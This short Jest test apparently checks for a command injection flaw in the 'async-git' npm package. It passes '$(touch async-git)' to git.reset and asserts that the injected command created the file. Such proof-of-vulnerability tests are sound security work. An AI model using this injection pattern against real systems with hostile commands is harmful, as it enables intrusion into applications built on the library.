test("Command Injection in async-git", async () => {
  expect.assertions(2);
  const git = require("async-git");
  const fs = require("fs");
  const path = "./async-git";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    await git.reset("$(touch async-git)");
  } catch (e) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
